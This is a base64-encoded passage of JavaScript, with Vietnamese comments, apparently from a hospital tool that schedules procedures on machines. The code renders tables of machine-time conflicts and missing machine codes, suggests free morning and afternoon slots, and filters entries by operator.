5PmA7DQogICAgDQogICAgZmlsdGVyZWRDb25mbGljdHMuZm9yRWFjaChjb25mbGljdCA9PiB7DQogICAgICAgIC8vIFRow6ptIGTDsm5nIHRow7RuZyB0aW4gduG7gSBtw6F5IHbDoCBuZ8OgeSB4dW5nIMSR4buZdA0KICAgICAgLy8gIGh0bWwgKz0gYA0KICAgICAgLy8gIDx0ciBjbGFzcz0iZXJyb3Itcm93IiBzdHlsZT0iYmFja2dyb3VuZC1jb2xvcjogI2ZmZjNjZDsiPg0KICAgICAgICAvLyAgICA8dGQgY29sc3Bhbj0iNSIgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsgZm9udC13ZWlnaHQ6IGJvbGQ7IGNvbG9yOiAjODU2NDA0OyI+DQogICAgICAgIC8vICAgICAgICA8aSBjbGFzcz0iZmFzIGZhLWV4Y2xhbWF0aW9uLXRyaWFuZ2xlIj48L2k+IA0KICAgICAgICAgIC8vICAgICAgWFVORyDEkOG7mFQgTcOBWTogJHtjb25mbGljdC5tYWNoaW5lQ29kZX0gLSBOR8OAWTogJHtjb25mbGljdC5kYXRlfQ0KICAgICAgICAgLy8gICA8L3RkPg0KICAgICAgLy8gIDwvdHI+YDsNCiAgICAgICAgDQogICAgICAgIGNvbmZsaWN0LmNvbmZsaWN0UHJvY2VkdXJlcy5mb3JFYWNoKChwcm9jLCBpbmRleCkgPT4gew0KICAgICAgICAgICAgaHRtbCArPSBgDQogICAgICAgICAgICA8dHIgY2xhc3M9ImVycm9yLXJvdyI+DQogICAgICAgICAgICAgICAgJHtpbmRleCA9PT0gMCA/IGA8dGQgcm93c3Bhbj0iJHtjb25mbGljdC5jb25mbGljdFByb2NlZHVyZXMubGVuZ3RofSI+JHtjb25mbGljdC5tYWNoaW5lQ29kZX08L3RkPmAgOiAnJ30NCiAgICAgICAgICAgICAgICA8dGQ+JHtwcm9jLnBhdGllbnROYW1lfSBbPGZvbnQgY29sb3I9InJlZCI+JHtwcm9jLnBhdGllbnRBZ2V9PC9mb250Pl08YnIvPiR7cHJvYy5wYXRpZW50SWR9PC90ZD4NCiAgICAgICAgICAgICAgICA8dGQ+JHtwcm9jLnByb2NlZHVyZX08L3RkPg0KICAgICAgICAgICAgICAgIDx0ZD48Y2VudGVyPiR7Y29uZmxpY3QuZGF0ZX08YnIvPiR7cHJvYy5kaXNwbGF5U3RhcnR9IOKGkiAke3Byb2MuZGlzcGxheUVuZH08L2NlbnRlcj48L3RkPg0KCQkJCTx0ZCBjbGFzcz0iZG9jdG9yLWNvbHVtbiIgc3R5bGU9IiR7ZG9jdG9yQ29sdW1uU3R5bGV9Ij4ke3Byb2MuZG9jdG9yIHx8ICdLaMO0bmcgY8OzJ308L3RkPg0KICAgICAgICAgICAgICAgIDx0ZD4ke3Byb2Mub3BlcmF0b3IucmVwbGFjZSgvLC9nLCAnJyl9PC90ZD4NCiAke2luZGV4ID09PSAwID8gYDx0ZCByb3dzcGFuPSIke2NvbmZsaWN0LmNvbmZsaWN0UHJvY2VkdXJlcy5sZW5ndGh9IiBjbGFzcz0idGltZS1zdWdnZXN0aW9uIiBpZD0ibWFjaGluZVN1Z2dlc3Rpb24tJHtjb25mbGljdC5tYWNoaW5lQ29kZX0tJHtjb25mbGljdC5kYXRlfSI+DQogICAgICAgICAgICAgICAgICAgIDwhLS0gR+G7o2kgw70gZ2nhu50gc+G6vSDEkcaw4bujYyBj4bqtcCBuaOG6rXQgc2F1IC0tPg0KICAgICAgICAgICAgICAgIDwvdGQ+YCA6ICcnfSAgICAgICAgICANCg0KDQoJCSAgPC90cj5gOw0KICAgICAgICB9KTsNCiAgICAgICAgaHRtbCArPSBgPHRyPjx0ZCBjb2xzcGFuPSIke3Nob3dEb2N0b3IgPyAnNycgOiAnNid9IiBjbGFzcz0iZ3JvdXAtc2VwYXJhdG9yIj48L3RkPjwvdHI+YDsNCiANCiAgICAgICAgaHRtbCArPSBgPHRyPjx0ZCBjb2xzcGFuPSI1IiBjbGFzcz0iZ3JvdXAtc2VwYXJhdG9yIj48L3RkPjwvdHI+YDsNCiAgICB9KTsNCiAgICANCiAgICBodG1sICs9IGA8L3Rib2R5PjwvdGFibGU+YDsNCiAgICANCiAgICBtYWNoaW5lQ29uZmxpY3RMb2dEaXYuaW5uZXJIVE1MID0gaHRtbDsNCn0NCg0KDQovLy9H4bujaSDDvSBnaeG7nSB4dW5nIMSR4buZdCBtw6F5Ly8vLy8NCi8vIEjDoG0gdOG6oW8gZ+G7o2kgw70gZ2nhu50gY2hvIHh1bmcgxJHhu5l0IG3DoXkNCmZ1bmN0aW9uIGdlbmVyYXRlTWFjaGluZVRpbWVTdWdnZXN0aW9ucygpIHsNCiAgICBjb25zdCB0aW1lT3B0aW9uID0gZG9jdW1lbnQucXVlcnlTZWxlY3RvcignaW5wdXRbbmFtZT0idGltZU9wdGlvbiJdOmNoZWNrZWQnKS52YWx1ZTsNCiAgICBjb25zdCBzdGFydEhvdXIgPSB0aW1lT3B0aW9uID09PSAnNzozMCcgPyA3LjUgOiA3Ow0KICAgIGNvbnN0IHNob3dNb3JlU3VnZ2VzdGlvbnMgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2hvd01vcmVTdWdnZXN0aW9uc0NoZWNrYm94JykuY2hlY2tlZDsNCiAgICANCiAgICAvLyBT4buRIGtodW5nIGdp4budIHThu5FpIMSRYSBt4buXaSBideG7lWkNCiAgICBjb25zdCBtYXhNb3JuaW5nID0gc2hvd01vcmVTdWdnZXN0aW9ucyA/IDMgOiAyOw0KICAgIGNvbnN0IG1heEFmdGVybm9vbiA9IHNob3dNb3JlU3VnZ2VzdGlvbnMgPyAzIDogMTsNCg0KICAgIG1hY2hpbmVDb25mbGljdExvZy5mb3JFYWNoKGNvbmZsaWN0ID0+IHsNCiAgICAgICAgY29uc3QgcHJvY2VkdXJlcyA9IGNvbmZsaWN0LmNvbmZsaWN0UHJvY2VkdXJlczsNCiAgICAgICAgY29uc3QgbWFjaGluZUNvZGUgPSBjb25mbGljdC5tYWNoaW5lQ29kZTsNCiAgICAgICAgY29uc3QgZGF0ZSA9IGNvbmZsaWN0LmRhdGU7DQogICAgICAgIA0KICAgICAgICAvLyBM4bqleSB04bqldCBj4bqjIHRo4bunIHRodeG6rXQgY8O5bmcgbmfDoHksIGPDuW5nIG3DoXkNCiAgICAgICAgY29uc3Qgc2FtZU1hY2hpbmVQcm9jZWR1cmVzID0gZ2V0QWxsUHJvY2VkdXJlc0Zvck1hY2hpbmUobWFjaGluZUNvZGUsIGRhdGUpOw0KICAgICAgICANCiAgICAgICAgLy8gVMOsbSBraHVuZyBnaeG7nSB0cuG7kW5nIGNobyB04burbmcgdGjhu6cgdGh14bqtdCB0cm9uZyB4dW5nIMSR4buZdA0KICAgICAgICBwcm9jZWR1cmVzLmZvckVhY2gocHJvYyA9PiB7DQogICAgICAgICAgICBjb25zdCBkdXJhdGlvblNlY29uZHMgPSBwcm9jLmVuZCAtIHByb2Muc3RhcnQ7DQogICAgICAgICAgICANCiAgICAgICAgICAgIC8vIFTDrG0ga2h1bmcgZ2nhu50gYnXhu5VpIHPDoW5nDQogICAgICAgICAgICBjb25zdCBtb3JuaW5nU2xvdHMgPSBmaW5kQXZhaWxhYmxlTWFjaGluZVNsb3RzKA0KICAgICAgICAgICAgICAgIHN0YXJ0SG91ciAqIDM2MDAsIA0KICAgICAgICAgICAgICAgIDExLjUgKiAzNjAwLCANCiAgICAgICAgICAgICAgICBkdXJhdGlvblNlY29uZHMsIA0KICAgICAgICAgICAgICAgIHNhbWVNYWNoaW5lUHJvY2VkdXJlcywNCiAgICAgICAgICAgICAgICBwcm9jZWR1cmVzLCAvLyBsb+G6oWkgdHLhu6sgY8OhYyB0aOG7pyB0aHXhuq10IMSRYW5nIHh1bmcgxJHhu5l0DQogICAgICAgICAgICAgICAgbWF4TW9ybmluZywNCiAgICAgICAgICAgICAgICBwcm9jLm9wZXJhdG9yLA0KICAgICAgICAgICAgICAgIGRhdGUNCiAgICAgICAgICAgICk7DQogICAgICAgICAgICANCiAgICAgICAgICAgIC8vIFTDrG0ga2h1bmcgZ2nhu50gYnXhu5VpIGNoaeG7gXUNCiAgICAgICAgICAgIGNvbnN0IGFmdGVybm9vblNsb3RzID0gZmluZEF2YWlsYWJsZU1hY2hpbmVTbG90cygNCiAgICAgICAgICAgICAgICAxMy41ICogMzYwMCwgDQogICAgICAgICAgICAgICAgMTcgKiAzNjAwLCANCiAgICAgICAgICAgICAgICBkdXJhdGlvblNlY29uZHMsIA0KICAgICAgICAgICAgICAgIHNhbWVNYWNoaW5lUHJvY2VkdXJlcywNCiAgICAgICAgICAgICAgICBwcm9jZWR1cmVzLA0KICAgICAgICAgICAgICAgIG1heEFmdGVybm9vbiwNCiAgICAgICAgICAgICAgICBwcm9jLm9wZXJhdG9yLA0KICAgICAgICAgICAgICAgIGRhdGUNCiAgICAgICAgICAgICk7DQoNCiAgICAgICAgICAgIC8vIEZvcm1hdCBr4bq/dCBxdeG6ow0KICAgICAgICAgICAgbGV0IHN1Z2dlc3Rpb25zID0gW107DQogICAgICAgICAgICBpZiAobW9ybmluZ1Nsb3RzLmxlbmd0aCA+IDApIHsNCiAgICAgICAgICAgICAgICBzdWdnZXN0aW9ucy5wdXNoKCc8c3Ryb25nPlPDoW5nOjwvc3Ryb25nPjxicj4nICsgDQogICAgICAgICAgICAgICAgICAgIG1vcm5pbmdTbG90cy5tYXAoc2xvdCA9PiBgJHtzbG90LnN0YXJ0fSAtICR7c2xvdC5lbmR9YCkuam9pbignPGJyPicpKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGlmIChhZnRlcm5vb25TbG90cy5sZW5ndGggPiAwKSB7DQogICAgICAgICAgICAgICAgc3VnZ2VzdGlvbnMucHVzaCgnPHN0cm9uZz5DaGnhu4F1Ojwvc3Ryb25nPjxicj4nICsgDQogICAgICAgICAgICAgICAgICAgIGFmdGVybm9vblNsb3RzLm1hcChzbG90ID0+IGAke3Nsb3Quc3RhcnR9IC0gJHtzbG90LmVuZH1gKS5qb2luKCc8YnI+JykpOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAvLyBMxrB1IGfhu6NpIMO9DQogICAgICAgICAgICBwcm9jLm1hY2hpbmVTdWdnZXN0aW9uID0gc3VnZ2VzdGlvbnMubGVuZ3RoID4gMCA/IHN1Z2dlc3Rpb25zLmpvaW4oJzxicj4nKSA6IA0KICAgICAgICAgICAgICAgICc8c3BhbiBjbGFzcz0ibm8tc3VnZ2VzdGlvbiI+S2jDtG5nIGPDsyBraHVuZyBnaeG7nSB0cuG7kW5nPC9zcGFuPic7DQogICAgICAgIH0pOw0KDQogICAgICAgIC8vIEPhuq1wIG5o4bqtdCBVSQ0KICAgICAgICB1cGRhdGVNYWNoaW5lU3VnZ2VzdGlvblVJKG1hY2hpbmVDb2RlLCBkYXRlLCBwcm9jZWR1cmVzKTsNCiAgICB9KTsNCn0NCg0KLy8gSMOgbSBs4bqleSB04bqldCBj4bqjIHRo4bunIHRodeG6rXQgY8O5bmcgbcOheSwgY8O5bmcgbmfDoHkNCmZ1bmN0aW9uIGdldEFsbFByb2NlZHVyZXNGb3JNYWNoaW5lKG1hY2hpbmVDb2RlLCBkYXRlKSB7DQogICAgY29uc3QgYWxsUHJvY3MgPSBbXTsNCiAgICANCiAgICBtYWNoaW5lQ29uZmxpY3RMb2cuZm9yRWFjaChjb25mbGljdCA9PiB7DQogICAgICAgIGlmIChjb25mbGljdC5tYWNoaW5lQ29kZSA9PT0gbWFjaGluZUNvZGUgJiYgY29uZmxpY3QuZGF0ZSA9PT0gZGF0ZSkgew0KICAgICAgICAgICAgYWxsUHJvY3MucHVzaCguLi5jb25mbGljdC5jb25mbGljdFByb2NlZHVyZXMpOw0KICAgICAgICB9DQogICAgfSk7DQogICAgDQogICAgLy8gVGjDqm0gY8OhYyB0aOG7pyB0aHXhuq10IGtow7RuZyB4dW5nIMSR4buZdCBuaMawbmcgY8O5bmcgbcOheSwgbmfDoHkNCiAgICBpZiAod2luZG93LmFsbFByb2NlZHVyZXMpIHsNCiAgICAgICAgd2luZG93LmFsbFByb2NlZHVyZXMuZm9yRWFjaChwcm9jID0+IHsNCiAgICAgICAgICAgIGlmIChwcm9jLm1hY2hpbmVDb2RlID09PSBtYWNoaW5lQ29kZSAmJiBwcm9jLmRhdGUgPT09IGRhdGUpIHsNCiAgICAgICAgICAgICAgICBhbGxQcm9jcy5wdXNoKHByb2MpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9KTsNCiAgICB9DQogICAgDQogICAgcmV0dXJuIGFsbFByb2NzOw0KfQ0KDQovLyBIw6BtIHTDrG0ga2h1bmcgZ2nhu50gdHLhu5FuZyBjaG8gbcOheQ0KZnVuY3Rpb24gZmluZEF2YWlsYWJsZU1hY2hpbmVTbG90cyhzdGFydFRpbWUsIGVuZFRpbWUsIGR1cmF0aW9uLCBtYWNoaW5lUHJvY2VkdXJlcywgY29uZmxpY3RQcm9jZWR1cmVzLCBtYXhTbG90cywgb3BlcmF0b3IsIGRhdGUpIHsNCiAgICBjb25zdCBzbG90cyA9IFtdOw0KICAgIGxldCBjdXJyZW50VGltZSA9IHN0YXJ0VGltZTsNCiAgICANCiAgICB3aGlsZSAoY3VycmVudFRpbWUgKyBkdXJhdGlvbiA8PSBlbmRUaW1lICYmIHNsb3RzLmxlbmd0aCA8IG1heFNsb3RzKSB7DQogICAgICAgIGlmICghaGFzTWFjaGluZVRpbWVDb25mbGljdChjdXJyZW50VGltZSwgZHVyYXRpb24sIG1hY2hpbmVQcm9jZWR1cmVzLCBjb25mbGljdFByb2NlZHVyZXMsIG9wZXJhdG9yLCBkYXRlKSkgew0KICAgICAgICAgICAgc2xvdHMucHVzaCh7DQogICAgICAgICAgICAgICAgc3RhcnQ6IHNlY29uZHNUb1RpbWVTdHIoY3VycmVudFRpbWUpLA0KICAgICAgICAgICAgICAgIGVuZDogc2Vjb25kc1RvVGltZVN0cihjdXJyZW50VGltZSArIGR1cmF0aW9uKQ0KICAgICAgICAgICAgfSk7DQogICAgICAgIH0NCiAgICAgICAgY3VycmVudFRpbWUgKz0gMTUgKiA2MDsgLy8gS2nhu4NtIHRyYSBt4buXaSAxNSBwaMO6dA0KICAgIH0NCiAgICANCiAgICByZXR1cm4gc2xvdHM7DQp9DQoNCi8vIEjDoG0ga2nhu4NtIHRyYSB4dW5nIMSR4buZdCB0aOG7nWkgZ2lhbiBjaG8gbcOheQ0KZnVuY3Rpb24gaGFzTWFjaGluZVRpbWVDb25mbGljdChzdGFydFRpbWUsIGR1cmF0aW9uLCBtYWNoaW5lUHJvY2VkdXJlcywgY29uZmxpY3RQcm9jZWR1cmVzLCBvcGVyYXRvciwgZGF0ZSkgew0KICAgIGNvbnN0IGVuZFRpbWUgPSBzdGFydFRpbWUgKyBkdXJhdGlvbjsNCiAgICANCiAgICAvLyBLaeG7g20gdHJhIHh1bmcgxJHhu5l0IG3DoXkNCiAgICBmb3IgKGNvbnN0IHByb2Mgb2YgbWFjaGluZVByb2NlZHVyZXMpIHsNCiAgICAgICAgaWYgKHByb2Muc3RhcnQgPCBlbmRUaW1lICYmIHByb2MuZW5kID4gc3RhcnRUaW1lKSB7DQogICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgfQ0KICAgIH0NCiAgICANCiAgICAvLyBLaeG7g20gdHJhIHh1bmcgxJHhu5l0IG5nxrDhu51pIHRo4buxYyBoaeG7h24NCiAgICBpZiAod2luZG93LmFsbFByb2NlZHVyZXMpIHsNCiAgICAgICAgY29uc3Qgb3BlcmF0b3JQcm9jZWR1cmVzID0gd2luZG93LmFsbFByb2NlZHVyZXMuZmlsdGVyKHAgPT4gDQogICAgICAgICAgICBwLm9wZXJhdG9yID09PSBvcGVyYXRvciAmJiANCiAgICAgICAgICAgIHAuZGF0ZSA9PT0gZGF0ZSAmJg0KICAgICAgICAgICAgIWNvbmZsaWN0UHJvY2VkdXJlcy5pbmNsdWRlcyhwKQ0KICAgICAgICApOw0KICAgICAgICANCiAgICAgICAgZm9yIChjb25zdCBwcm9jIG9mIG9wZXJhdG9yUHJvY2VkdXJlcykgew0KICAgICAgICAgICAgY29uc3QgcHJvY1N0YXJ0ID0gcHJvYy5zdGFydDsNCiAgICAgICAgICAgIGNvbnN0IHByb2NFbmQgPSBwcm9jLmVuZCArIChwcm9jLnByb2NlZHVyZUluZm8/LmJ1ZmZlciB8fCAwKSAqIDYwOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBpZiAoKHN0YXJ0VGltZSA+PSBwcm9jU3RhcnQgJiYgc3RhcnRUaW1lIDwgcHJvY0VuZCkgfHwgDQogICAgICAgICAgICAgICAgKGVuZFRpbWUgPiBwcm9jU3RhcnQgJiYgZW5kVGltZSA8PSBwcm9jRW5kKSB8fA0KICAgICAgICAgICAgICAgIChzdGFydFRpbWUgPD0gcHJvY1N0YXJ0ICYmIGVuZFRpbWUgPj0gcHJvY0VuZCkpIHsNCiAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCiAgICANCiAgICByZXR1cm4gZmFsc2U7DQp9DQoNCi8vIEjDoG0gY+G6rXAgbmjhuq10IFVJIGfhu6NpIMO9DQovLyBIw6BtIGPhuq1wIG5o4bqtdCBVSSBn4bujaSDDvQ0KZnVuY3Rpb24gdXBkYXRlTWFjaGluZVN1Z2dlc3Rpb25VSShtYWNoaW5lQ29kZSwgZGF0ZSwgcHJvY2VkdXJlcykgew0KICAgIGNvbnN0IHN1Z2dlc3Rpb25DZWxsID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoYG1hY2hpbmVTdWdnZXN0aW9uLSR7bWFjaGluZUNvZGV9LSR7ZGF0ZX1gKTsNCiAgICBpZiAoc3VnZ2VzdGlvbkNlbGwpIHsNCiAgICAgICAgLy8gTOG6pXkgZ+G7o2kgw70gdOG7qyB0aOG7pyB0aHXhuq10IMSR4bqndSB0acOqbiAodsOsIHThuqV0IGPhuqMgxJHhu4F1IGdp4buRbmcgbmhhdSkNCiAgICAgICAgY29uc3QgZmlyc3RQcm9jID0gcHJvY2VkdXJlc1swXTsNCiAgICAgICAgaWYgKGZpcnN0UHJvYyAmJiBmaXJzdFByb2MubWFjaGluZVN1Z2dlc3Rpb24pIHsNCiAgICAgICAgICAgIHN1Z2dlc3Rpb25DZWxsLmlubmVySFRNTCA9IGZpcnN0UHJvYy5tYWNoaW5lU3VnZ2VzdGlvbjsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIHN1Z2dlc3Rpb25DZWxsLmlubmVySFRNTCA9ICc8c3BhbiBjbGFzcz0ibm8tc3VnZ2VzdGlvbiI+S2jDtG5nIGPDsyBraHVuZyBnaeG7nSB0cuG7kW5nPC9zcGFuPic7DQogICAgICAgIH0NCiAgICB9DQp9DQoNCg0KDQoNCg0KLy8gSMOgbSBoaeG7g24gdGjhu4sgbOG7l2kgcXXDqm4gZ+G6r24gbcOjIG3DoXkNCmZ1bmN0aW9uIGRpc3BsYXlNaXNzaW5nTWFjaGluZUVycm9ycygpIHsNCiAgICBjb25zdCBtaXNzaW5nTWFjaGluZUxvZ0RpdiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdtaXNzaW5nTWFjaGluZUxvZycpOw0KICAgIGNvbnN0IG1pc3NpbmdNYWNoaW5lU2VjdGlvbiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdtaXNzaW5nTWFjaGluZVNlY3Rpb24nKTsNCiAgICBpZiAobWlzc2luZ01hY2hpbmVMb2cubGVuZ3RoID09PSAwKSB7DQogICAgICAgIG1pc3NpbmdNYWNoaW5lTG9nRGl2LmlubmVySFRNTCA9ICc8cD5LaMO0bmcgY8OzIGzhu5dpIHF1w6puIGfhuq9uIG3DoyBtw6F5IG7DoG8gxJHGsOG7o2MgZ2hpIG5o4bqtbjwvcD4nOw0KICAgICAgICBtaXNzaW5nTWFjaGluZVNlY3Rpb24uc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICAgICAgcmV0dXJuOw0KICAgIH0NCiAgICANCiAgICBjb25zdCBzaG93RG9jdG9yID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Nob3dEb2N0b3JDaGVja2JveCcpLmNoZWNrZWQ7DQogICAgY29uc3QgZG9jdG9yQ29sdW1uU3R5bGUgPSBzaG93RG9jdG9yID8gJycgOiAnZGlzcGxheTpub25lJzsNCiAgICANCiAgICBsZXQgaHRtbCA9IGANCiAgICA8dGFibGUgY2xhc3M9ImVycm9yLXRhYmxlIj4NCiAgICAgICAgPHRoZWFkPg0KICAgICAgICAgICAgPHRyPg0KICAgICAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLXVzZXIgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IFTDqm4gQk48L3RoPg0KICAgICAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLXByb2NlZHVyZXMgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IFRo4bunIHRodeG6rXQ8L3RoPg0KICAgICAgICAgICAgICAgIDx0aCBjbGFzcz0iZG9jdG9yLWNvbHVtbiIgc3R5bGU9IiR7ZG9jdG9yQ29sdW1uU3R5bGV9Ij48aSBjbGFzcz0iZmFzIGZhLXVzZXItbWQgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IELDoWMgc+G7uSBjaOG7iSDEkeG7i25oPC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS11c2VyLW51cnNlIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBOZ8aw4budaSB0aOG7sWMgaGnhu4duPC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhciBmYS1jbG9jayBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVGjhu51pIGdpYW48L3RoPg0KICAgICAgICAgICAgPC90cj4NCiAgICAgICAgPC90aGVhZD4NCiAgICAgICAgPHRib2R5PmA7DQogICAgDQogICAgbWlzc2luZ01hY2hpbmVMb2cuZm9yRWFjaChlcnJvciA9PiB7DQogICAgICAgIGh0bWwgKz0gYA0KICAgICAgICA8dHIgY2xhc3M9ImVycm9yLXJvdyI+DQogICAgICAgICAgICA8dGQ+JHtlcnJvci5wYXRpZW50TmFtZX0gWzxmb250IGNvbG9yPSJyZWQiPiR7ZXJyb3IucGF0aWVudEFnZX08L2ZvbnQ+XTxici8+JHtlcnJvci5wYXRpZW50SWR9PC90ZD4NCiAgICAgICAgICAgIDx0ZD4ke2Vycm9yLnByb2NlZHVyZX08L3RkPg0KICAgICAgICAgICAgPHRkIGNsYXNzPSJkb2N0b3ItY29sdW1uIiBzdHlsZT0iJHtkb2N0b3JDb2x1bW5TdHlsZX0iPiR7ZXJyb3IuZG9jdG9yIHx8ICdLaMO0bmcgY8OzJ308L3RkPg0KICAgICAgICAgICAgPHRkPiR7ZXJyb3Iub3BlcmF0b3IucmVwbGFjZSgvLC9nLCAnJyl9PC90ZD4NCiAgICAgICAgICAgIDx0ZD48Y2VudGVyPiR7ZXJyb3IuZGF0ZX08YnIvPiR7ZXJyb3Iuc3RhcnRUaW1lfSDihpIgJHtlcnJvci5lbmRUaW1lfTwvY2VudGVyPjwvdGQ+DQogICAgICAgIDwvdHI+YDsNCiAgICB9KTsNCiAgICANCiAgICBodG1sICs9IGA8L3Rib2R5PjwvdGFibGU+YDsNCiAgICANCiAgICBtaXNzaW5nTWFjaGluZUxvZ0Rpdi5pbm5lckhUTUwgPSBodG1sOw0KICAgIG1pc3NpbmdNYWNoaW5lU2VjdGlvbi5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgICANCiAgICAvLyBD4bqtcCBuaOG6rXQgZHJvcGRvd24gbOG7jWMNCiAgICB1cGRhdGVNaXNzaW5nTWFjaGluZU9wZXJhdG9yRmlsdGVyKCk7DQp9DQoNCi8vIEPhuq1wIG5o4bqtdCBkcm9wZG93biBs4buNYyBjaG8gcXXDqm4gZ+G6r24gbcOjIG3DoXkNCmZ1bmN0aW9uIHVwZGF0ZU1pc3NpbmdNYWNoaW5lT3BlcmF0b3JGaWx0ZXIoKSB7DQogICAgY29uc3Qgb3BlcmF0b3JzID0gWy4uLm5ldyBTZXQobWlzc2luZ01hY2hpbmVMb2cubWFwKGVycm9yID0+IGVycm9yLm9wZXJhdG9yKSldOw0KICAgIGNvbnN0IG9wZXJhdG9yU2VsZWN0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ21pc3NpbmdNYWNoaW5lT3BlcmF0b3JTZWxlY3QnKTsNCiAgICBvcGVyYXRvclNlbGVjdC5pbm5lckhUTUwgPSAnPG9wdGlvbiB2YWx1ZT0iYWxsIj5U4bqldCBj4bqjPC9vcHRpb24+JyArIA0KICAgICAgICBvcGVyYXRvcnMubWFwKG9wID0+IGA8b3B0aW9uIHZhbHVlPSIke29wfSI+JHtvcC5yZXBsYWNlKC8sL2csICcnKX08L29wdGlvbj5gKS5qb2luKCcnKTsNCiAgICANCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbWlzc2luZ01hY2hpbmVPcGVyYXRvckZpbHRlcicpLnN0eWxlLmRpc3BsYXkgPSBvcGVyYXRvcnMubGVuZ3RoID4gMCA/ICdibG9jaycgOiAnbm9uZSc7DQp9DQoNCi8vIEzhu41jIHF1w6puIGfhuq9uIG3DoyBtw6F5IHRoZW8gbmfGsOG7nWkgdGjhu7FjIGhp4buHbg0KZnVuY3Rpb24gZmlsdGVyTWlzc2luZ01hY2hpbmVCeU9wZXJhdG9yKCkgew0KICAgIGNvbnN0IG9wZXJhdG9yID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ21pc3NpbmdNYWNoaW5lT3BlcmF0b3JTZWxlY3QnKS52YWx1ZTsNCiAgICBjb25zdCBmaWx0ZXJlZEVycm9ycyA9IG9wZXJhdG9yID09PSAnYWxsJyANCiAgICAgICAgPyBtaXNzaW5nTWFjaGluZUxvZyANCiAgICAgICAgOiBtaXNzaW5nTWFjaGluZUxvZy5maWx0ZXIoZXJyb3IgPT4gZXJyb3Iub3BlcmF0b3IucmVwbGFjZSgvLC9nLCAnJykgPT09IG9wZXJhdG9yLnJlcGxhY2UoLywvZywgJycpKTsNCiAgICANCiAgICBkaXNwbGF5RmlsdGVyZWRNaXNzaW5nTWFjaGluZUVycm9ycyhmaWx0ZXJlZEVycm9ycyk7DQp9DQoNCi8vIEhp4buDbiB0aOG7iyBs4buXaSBxdcOqbiBn4bqvbiBtw6MgbcOheSDEkcOjIGzhu41jDQpmdW5jdGlvbiBkaXNwbGF5RmlsdGVyZWRNaXNzaW5nTWFjaGluZUVycm9ycyhmaWx0ZXJlZEVycm9ycykgew0KICAgIGNvbnN0IG1pc3NpbmdNYWNoaW5lTG9nRGl2ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ21pc3NpbmdNYWNoaW5lTG9nJyk7DQogICAgIGNvbnN0IHNob3dEb2N0b3IgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2hvd0RvY3RvckNoZWNrYm94JykuY2hlY2tlZDsNCiAgICBjb25zdCBkb2N0b3JDb2x1bW5TdHlsZSA9IHNob3dEb2N0b3IgPyAnJyA6ICdkaXNwbGF5Om5vbmUnOw0KICAgIGlmIChmaWx0ZXJlZEVycm9ycy5sZW5ndGggPT09IDApIHsNCiAgICAgICAgbWlzc2luZ01hY2hpbmVMb2dEaXYuaW5uZXJIVE1MID0gJzxwPktow7RuZyBjw7MgbOG7l2kgcXXDqm4gZ+G6r24gbcOjIG3DoXkgbsOgbyDEkcaw4bujYyBnaGkgbmjhuq1uPC9wPic7DQogICAgICAgIHJldHVybjsNCiAgICB9DQogICAgDQogICAgbGV0IGh0bWwgPSBgDQogICAgPHRhYmxlIGNsYXNzPSJlcnJvci10YWJsZSI+DQogICAgICAgIDx0aGVhZD4NCiAgICAgICAgICAgIDx0cj4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS11c2VyIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUw6puIEJOPC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS1wcm9jZWR1cmVzIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUaOG7pyB0aHXhuq10PC90aD4NCgkJCQk8dGggY2xhc3M9ImRvY3Rvci1jb2x1bW4iIHN0eWxlPSIke2RvY3RvckNvbHVtblN0eWxlfSI+PGkgY2xhc3M9ImZhcyBmYS11c2VyLW1kIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBCw6FjIHPhu7kgY2jhu4kgxJHhu4tuaDwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlci1udXJzZSBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTmfGsOG7nWkgdGjhu7FjIGhp4buHbjwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXIgZmEtY2xvY2sgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IFRo4budaSBnaWFuPC90aD4NCiAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgPC90cj4NCiAgICAgICAgPC90aGVhZD4NCiAgICAgICAgPHRib2R5PmA7DQogICAgDQogICAgZmlsdGVyZWRFcnJvcnMuZm9yRWFjaChlcnJvciA9PiB7DQogICAgICAgIGh0bWwg